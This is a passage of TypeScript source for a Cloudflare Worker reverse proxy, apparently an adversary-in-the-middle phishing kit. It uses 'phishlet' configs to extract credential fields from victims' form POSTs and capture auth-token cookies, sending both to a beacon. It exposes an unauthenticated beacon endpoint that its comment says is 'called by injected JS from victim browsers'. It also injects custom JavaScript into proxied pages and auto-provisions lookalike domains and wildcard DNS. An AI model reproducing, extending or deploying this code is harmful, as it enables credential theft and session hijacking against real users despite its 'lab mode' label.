  if (cfCountry) headers.set("CF-IPCountry", cfCountry);
  const cfColo = (request as Request & { cf?: { colo?: string } }).cf?.colo;
  if (cfColo) headers.set("CF-Ray", request.headers.get("CF-Ray") ?? "");

  const upstream = new Request(target.toString(), {
    method: request.method,
    headers,
    body:
      request.method === "GET" || request.method === "HEAD"
        ? undefined
        : request.body,
    redirect: "manual",
  });

  try {
    const response = await fetch(upstream);
    const respHeaders = new Headers(response.headers);
    for (const name of hopByHopFor(request)) respHeaders.delete(name);
    respHeaders.set("X-Proxied-By", "edge-gateway-dashboard");
    if (proxyLabel) respHeaders.set("X-Proxy-Target", proxyLabel);

    // Intercept capture: only if lab mode is on AND this proxy has intercept
    // enabled. Check env var first, then fall back to DO runtime config.
    // Capture whenever the request OR response has a text-based content type
    // so form POSTs that return a redirect (no response body) are still caught.
    const envLabOn = env.INTERCEPT_LAB_MODE === "true";
    const runtimeConfig = await resolveRuntimeConfig(env);
    const labOn = envLabOn || runtimeConfig["INTERCEPT_LAB_MODE"] === "true";

    // INTERCEPT_ALLOWLIST: comma-separated hostnames — only capture these hosts.
    // INTERCEPT_BLOCKLIST: comma-separated hostnames — never capture these hosts.
    const allowlistRaw = (env.INTERCEPT_ALLOWLIST ?? runtimeConfig["INTERCEPT_ALLOWLIST"] ?? "").trim();
    const blocklistRaw = (env.INTERCEPT_BLOCKLIST ?? runtimeConfig["INTERCEPT_BLOCKLIST"] ?? "").trim();
    const allowlist = allowlistRaw ? allowlistRaw.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean) : [];
    const blocklist = blocklistRaw ? blocklistRaw.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean) : [];
    const targetHost = target.host.toLowerCase();
    const hostAllowed = allowlist.length === 0 || allowlist.some((h) => targetHost === h || targetHost.endsWith(`.${h}`));
    const hostBlocked = blocklist.length > 0 && blocklist.some((h) => targetHost === h || targetHost.endsWith(`.${h}`));

    const shouldIntercept = labOn && preResolvedConfig?.interceptEnabled && hostAllowed && !hostBlocked;

    let interceptPromise: Promise<void> | undefined;
    let beaconPromise: Promise<void> | undefined;
    if (shouldIntercept) {
      const reqContentType = request.headers.get("Content-Type") ?? "";
      const respContentType = response.headers.get("Content-Type") ?? "";
      const isInterceptable =
        isInterceptableContentType(reqContentType) ||
        isInterceptableContentType(respContentType) ||
        response.status === 0;
      if (isInterceptable) {
        const incomingHeaders = new Headers(request.headers);
        for (const name of HOP_BY_HOP) incomingHeaders.delete(name);
        const reqBody = request.clone().text().then(
          (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
        ).catch(() => "");
        const respBody = response.clone().text().then(
          (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
        ).catch(() => "");
        interceptPromise = Promise.all([reqBody, respBody]).then(
          ([reqB, respB]) =>
            logIntercept(env, {
              ts: Date.now(),
              slug: proxyLabel,
              method: request.method,
              path: target.pathname + (target.search || ""),
              reqHeaders: JSON.stringify(Object.fromEntries(incomingHeaders.entries())),
              reqBody: reqB,
              respStatus: response.status,
              respHeaders: JSON.stringify(Object.fromEntries(respHeaders.entries())),
              respBody: respB,
              host: target.host,
            }),
        );
      }

      // Phishlet-aware extraction: if this proxy has a phishlet, try to capture
      // credentials from the request body and auth tokens from Set-Cookie headers.
      if (preResolvedConfig?.phishlet) {
        const phishlet = parsePhishlet(preResolvedConfig.phishlet);
        if (phishlet) {
          const credKeys = phishlet.credentials
            ?.map((c) => c.key)
            .filter((k): k is string => typeof k === "string" && k.length > 0) ?? [];
          const authTokenNames = phishlet.auth_tokens
            ?.map((t) => t.name)
            .filter((n): n is string => typeof n === "string" && n.length > 0) ?? [];
          const baseUrl = `${incoming.protocol}//${incoming.host}`;
          beaconPromise = request.clone().text().then((text) => {
            const params = new URLSearchParams(text);
            const found: Record<string, string> = {};
            for (const key of credKeys) {
              if (params.has(key)) found[key] = params.get(key) ?? "";
            }
            if (Object.keys(found).length === 0) return;
            const cookies: string[] = [];
            response.headers.forEach((value, key) => {
              if (key.toLowerCase() === "set-cookie") {
                const name = value.split(";")[0].split("=")[0].trim();
                if (authTokenNames.length === 0 || authTokenNames.includes(name)) {
                  cookies.push(value);
                }
              }
            });
            return sendBeacon(env, baseUrl, {
              proxy: proxyLabel,
              url: target.toString(),
              credentials: found,
              cookies,
              phishlet: phishlet.name ?? proxyLabel,
            });
          }).catch(() => undefined);
        }
      }
    }

    // If the proxied response is HTML and we have a proxy domain, rewrite
    // content so links, redirects, and SPA routing stay inside the proxy.
    let finalResponse = new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: respHeaders,
    });

    const contentType = (response.headers.get("Content-Type") ?? "").toLowerCase();
    const isHtml = contentType.includes("text/html") || contentType.includes("application/xhtml");
    if (isHtml && proxyLabel) {
      const config = preResolvedConfig ?? await resolveProxy(env, proxyLabel);
      if (config?.proxyDomain) {
        try {
          finalResponse = rewriteProxiedContent(
            finalResponse,
            config.proxyDomain,
            target.host,
            config.injectJsEnabled && config.injectJs ? config.injectJs : undefined,
          );
        } catch {
          // HTMLRewriter failed — return the unrewritten response.
        }
      }
    }

    return {
      proxy: proxyLabel,
      response: decorate(finalResponse),
      interceptPromise,
      beaconPromise,
    };
  } catch {
    return {
      proxy: proxyLabel,
      response: decorate(
        Response.json(
          { success: false, error: "bad gateway — upstream unreachable" },
          { status: 502 },
        ),
      ),
      interceptPromise: undefined,
      beaconPromise: undefined,
    };
  }
}

export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;
    const start = Date.now();

    if (method === "OPTIONS") {
      const headers = new Headers({ ...CORS, ...SECURITY });
      headers.set("Access-Control-Allow-Origin", await resolveCorsOrigin(request, env));
      return new Response(null, { status: 204, headers });
    }

    const corsOrigin = await resolveCorsOrigin(request, env);

    const clientIp =
      request.headers.get("CF-Connecting-IP") ??
      request.headers.get("X-Forwarded-For") ??
      "anonymous";

    if (path === "/proxy" || path.startsWith("/proxy/")) {
      const { response: proxied, proxy, interceptPromise, beaconPromise } = await reverseProxy(request, env);
      ctx.waitUntil(
        logTraffic(
          request,
          env,
          buildTrafficEntry(request, proxied, path, Date.now() - start, clientIp, proxy),
        ),
      );
      if (proxy) ctx.waitUntil(bumpProxyHits(env, proxy));
      if (interceptPromise) ctx.waitUntil(interceptPromise);
      if (beaconPromise) ctx.waitUntil(beaconPromise);
      return proxied;
    }

    // --- Wildcard host routing ---
    // If the request arrived on a subdomain that matches a configured proxy
    // domain (e.g. app.mydomain.com), route it to that proxy's target.
    const incomingHost = url.host.toLowerCase();
    const hostProxy = await resolveProxyByDomain(env, incomingHost);
    if (hostProxy && hostProxy.enabled) {
      const proxyPath = `/proxy/${hostProxy.slug}${path}${url.search}`;
      const proxyReq = new Request(
        `${url.protocol}//${url.host}${proxyPath}`,
        request,
      );
      const { response: hproxied, proxy: hproxy, interceptPromise: hip, beaconPromise: hbp } =
        await reverseProxy(proxyReq, env, hostProxy);
      ctx.waitUntil(
        logTraffic(
          request,
          env,
          buildTrafficEntry(request, hproxied, path, Date.now() - start, clientIp, hproxy),
        ),
      );
      if (hproxy) ctx.waitUntil(bumpProxyHits(env, hproxy));
      if (hip) ctx.waitUntil(hip);
      if (hbp) ctx.waitUntil(hbp);
      return hproxied;
    }

    if (path === "/" || path === "/ping") {
      return decorate(
        Response.json({
          ok: true,
          gateway: "edge-gateway-dashboard",
          timestamp: new Date().toISOString(),
        }),
        corsOrigin,
      );
    }

    if (path === "/api/cloudflare/zones" && method === "GET") {
      return await listZones(env);
    }
    if (path === "/api/cloudflare/allocate" && method === "POST") {
      return await allocateDomain(request, env);
    }
    if (path === "/api/cloudflare/wildcard" && method === "POST") {
      return await createWildcardDns(request, env);
    }
    if (path === "/api/cloudflare/worker-routes" && method === "GET") {
      return await listWorkerRoutes(env);
    }
    const workerRouteDeleteMatch = path.match(/^\/api\/cloudflare\/worker-routes\/([^/]+)\/([^/]+)$/);
    if (workerRouteDeleteMatch && method === "DELETE") {
      return await deleteWorkerRoute(env, workerRouteDeleteMatch[1], workerRouteDeleteMatch[2]);
    }

    // Intercept DELETE on a proxy target so we can clean up the Cloudflare
    // DNS record and the associated intercept captures before the row is
    // removed from durable storage.
    const proxyDeleteMatch = path.match(/^\/api\/proxies\/(\d+)$/);
    if (proxyDeleteMatch && method === "DELETE") {
      const id = Number(proxyDeleteMatch[1]);
      const proxy = await resolveProxyById(env, id);
      if (proxy?.cfZoneId && proxy.cfRecordId) {
        ctx.waitUntil(deleteDnsRecord(env, proxy.cfZoneId, proxy.cfRecordId));
      }
      if (proxy?.slug) {
        ctx.waitUntil(deleteInterceptsForSlug(env, proxy.slug));
      }
      // Fall through to dispatch — DO handles the actual row deletion.
    }

    // Intercept POST /api/proxies so we can auto-allocate a Cloudflare
    // domain after the DO creates the record.
    const isProxyCreate = path === "/api/proxies" && method === "POST";

    const isTraffic = path === "/api/traffic";
    const isIntercepts = path === "/api/intercepts";
    const isProxyConfig = path === "/api/proxies" || /^\/api\/proxies\/\d+$/.test(path);
    const isWildcardDns = path === "/api/cloudflare/wildcard";
    const isWorkerRoutes = path === "/api/cloudflare/worker-routes" || /^\/api\/cloudflare\/worker-routes\/.+/.test(path);
    const isBeacon = path === "/api/beacon";

    // --- Beacon endpoint (no auth — called by injected JS from victim browsers) ---
    if (isBeacon && method === "POST") {
      let body = "";
      try { body = await request.clone().text(); } catch { /* ignore */ }
      ctx.waitUntil(
        logIntercept(env, {
          ts: Date.now(),
          slug: "beacon",
          method: "POST",
          path: "/api/beacon",
          reqHeaders: JSON.stringify({ "content-type": request.headers.get("content-type") ?? "", "origin": request.headers.get("origin") ?? "", "referer": request.headers.get("referer") ?? "" }),
          reqBody: body,
          respStatus: 200,
          respHeaders: "{}",
          respBody: "",
          host: request.headers.get("referer") ?? request.headers.get("origin") ?? "beacon",
        })
      );
      const resp = new Response(null, { status: 204 });
      resp.headers.set("Access-Control-Allow-Origin", "*");
      resp.headers.set("Access-Control-Allow-Methods", "POST, OPTIONS");
      return resp;
    }

    // --- Auth gate ----------------------------------------------------
    if (requiresAuth(path, method)) {
      const authErr = await checkAuth(request, env);
      if (authErr) return authErr;
    }

    // --- Body size gate -------------------------------------------------
    const isWrite = method === "POST" || method === "PUT" || method === "PATCH";
    if (isWrite) {
      const contentLength = Number(request.headers.get("Content-Length") ?? "0");
      if (contentLength > WRITE_BODY_MAX_BYTES) {
        return decorate(
          Response.json(
            { success: false, error: `request body exceeds ${WRITE_BODY_MAX_BYTES} byte limit` },
            { status: 413 },
          ),
          corsOrigin,
        );
      }
    }

    const isConfigRoute = path === "/api/config";
    if (
      path !== "/health" &&
      !path.startsWith("/api/items") &&
      !isTraffic &&
      !isIntercepts &&
      !isProxyConfig &&
      !isConfigRoute &&
      !isWildcardDns &&
      !isWorkerRoutes &&
      !isBeacon
    ) {
      return decorate(
        Response.json({ success: false, error: "not found" }, { status: 404 }),
        corsOrigin,
      );
    }

    // Per-IP rate limit + edge cache both live in the DO (single resident
    // instance), so HIT/MISS and rate budgets are consistent. Pass config forward.
    const originReq = new Request(request.url, request);
    originReq.headers.set("X-Client-IP", clientIp);
    originReq.headers.set("X-Rate-Limit", String(RATE_LIMIT_REQUESTS));
    originReq.headers.set("X-Rate-Window", String(RATE_LIMIT_WINDOW));
    originReq.headers.set("X-Cache-TTL", String(CACHE_TTL));

    const response = await dispatch(originReq, env);
    const latency = `${Date.now() - start}ms`;

    const extra: Record<string, string> = { "X-Edge-Latency": latency };
    if (!response.headers.has("X-Cache")) {
      extra["X-Cache"] = "BYPASS";
    }
    const decorated = decorate(response, corsOrigin, extra);

    // Auto-allocate a Cloudflare domain when a new proxy is created, so the
    // user doesn't have to manually pick a zone — the gateway handles it.
    if (isProxyCreate && decorated.ok) {
      const cloned = decorated.clone();
      ctx.waitUntil(
        cloned
          .json()
          .then((json: { data?: { id: number; slug: string } }) => {
            const proxy = json?.data;
            if (proxy?.id && proxy?.slug) {
              return autoAllocateDomain(env, proxy.id, proxy.slug, url.host);
            }
          })
          .catch(() => undefined),
      );
    }

    // Intercept everything except reads of the analyser feed, proxy config
    // management, and config routes, so the traffic view stays clean.
    if (!isTraffic && !isProxyConfig && !isConfigRoute) {
      ctx.waitUntil(
        logTraffic(
          request,
          env,
          buildTrafficEntry(request, decorated, path, Date.now() - start, clientIp),
        ),
      );
    }
    return decorated;
  },
} satisfies ExportedHandler<Env>;
